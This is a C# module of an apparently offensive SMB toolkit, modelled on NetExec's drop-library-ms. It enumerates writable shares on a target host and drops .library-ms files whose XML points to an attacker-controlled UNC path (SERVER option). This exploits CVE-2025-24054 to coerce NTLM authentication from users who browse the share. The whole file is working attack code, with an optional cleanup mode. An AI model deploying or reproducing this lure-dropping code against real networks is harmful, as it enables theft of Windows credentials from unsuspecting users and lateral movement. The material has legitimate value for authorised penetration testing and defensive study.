using Titanis;
using System.Text;
using Titanis.Smb2;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// NetExec drop-library-ms: drops .library-ms coercion lures (CVE-2025-24054).
/// Options: SERVER=<attacker> (required), NAME=<name> (required), IGNORE=..., CLEANUP=True.
/// </summary>
public sealed class SmbDropLibraryMsModule : AtlasModule<Smb2Client>
{
	public override string Name => "drop-library-ms";
	public override string Description => "Drops .library-ms coercion lures (SERVER=..., NAME=..., IGNORE=..., CLEANUP=True)";

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		string server = ctx.Option("SERVER", "");
		string name = ctx.Option("NAME", "");
		if (string.IsNullOrWhiteSpace(server) || string.IsNullOrWhiteSpace(name))
		{
			AtlasConsole.Fail($"{ctx.Host}:445", "(drop-library-ms) SERVER and NAME are required (e.g. -mo SERVER=10.0.0.5,NAME=Docs)");
			return;
		}
		bool cleanup = ctx.Option("CLEANUP", "").Equals("True", StringComparison.OrdinalIgnoreCase);
		var ignore = new HashSet<string>(ctx.Option("IGNORE", "C$,ADMIN$,NETLOGON,SYSVOL").Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries), StringComparer.OrdinalIgnoreCase);
		string fileName = $"{name}.library-ms";
		try
		{
			string xml = $"<?xml version=\"1.0\" encoding=\"UTF-8\"?><libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"><searchConnectorDescriptionList><searchConnectorDescription><simpleLocation><url>\\\\{server}\\LIBRARY</url></simpleLocation></searchConnectorDescription></searchConnectorDescriptionList></libraryDescription>";
			byte[] content = Encoding.UTF8.GetBytes(xml);
			var shares = await SmbDropHelper.WritableSharesAsync(ctx, ignore, cancellationToken).ConfigureAwait(false);
			foreach (var share in shares)
			{
				cancellationToken.ThrowIfCancellationRequested();
				try
				{
					if (cleanup)
					{
						try { await ctx.Client.DeleteFileAsync(new Titanis.UncPath(ctx.Host, share, fileName), cancellationToken).ConfigureAwait(false); AtlasConsole.Success($"{ctx.Host}:445", $"(drop-library-ms) cleaned \\\\{ctx.Host}\\{share}\\{fileName}"); }
						catch { AtlasConsole.Info($"{ctx.Host}:445", $"(drop-library-ms) nothing to clean on {share}"); }
					}
					else
					{
						await SmbDropHelper.PutAsync(ctx, share, fileName, content, cancellationToken).ConfigureAwait(false);
						AtlasConsole.Success($"{ctx.Host}:445", $"(drop-library-ms) dropped \\\\{ctx.Host}\\{share}\\{fileName} -> \\\\{server}\\LIBRARY");
					}
				}
				catch (Exception ex) { AtlasConsole.Warn($"{ctx.Host}:445", $"(drop-library-ms) {share}: {ex.Message}"); }
			}
			if (shares.Count == 0) AtlasConsole.Info($"{ctx.Host}:445", "(drop-library-ms) no writable shares found");
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{ctx.Host}:445", $"(drop-library-ms) Failed: {ex.Message}");
		}
	}
}
